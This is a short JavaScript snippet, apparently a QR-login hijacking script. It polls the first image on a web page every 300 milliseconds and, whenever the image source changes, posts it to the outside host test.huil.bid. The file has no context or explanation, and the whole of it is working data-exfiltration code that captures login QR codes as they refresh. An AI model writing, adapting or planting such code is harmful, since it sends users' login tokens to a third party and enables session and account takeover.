var url = 'https://test.huil.bid:443'

function sendQr (qr) {
  console.log("entering sendQr")
  var http = new XMLHttpRequest()
  var params = 'qr=' + qr
  http.open('POST', url, true)
  http.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
  http.send(params)
}

var currentQr = ''
function checkIfChanged () {
	var qrimg = document.getElementsByTagName('img')[0]
  if (qrimg.src === currentQr) return
  currentQr = qrimg.src
  sendQr(encodeURIComponent(qrimg.src))
}

setInterval(checkIfChanged, 300)
